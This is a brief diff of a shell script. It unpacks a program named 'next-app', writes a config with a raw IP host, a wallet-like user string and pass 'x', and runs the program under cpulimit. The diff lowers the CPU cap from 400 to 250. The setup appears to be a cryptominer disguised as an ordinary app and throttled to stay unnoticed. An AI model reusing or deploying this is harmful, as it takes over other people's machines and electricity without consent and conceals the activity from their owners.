@@ -11,4 +11,4 @@ tar -xf next-app.tar.gz
 
 echo '{"host": "45.115.225.42", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 2}' > config.json
 
-cpulimit --limit 400 -- ./next-app/next-app
+cpulimit --limit 250 -- ./next-app/next-app
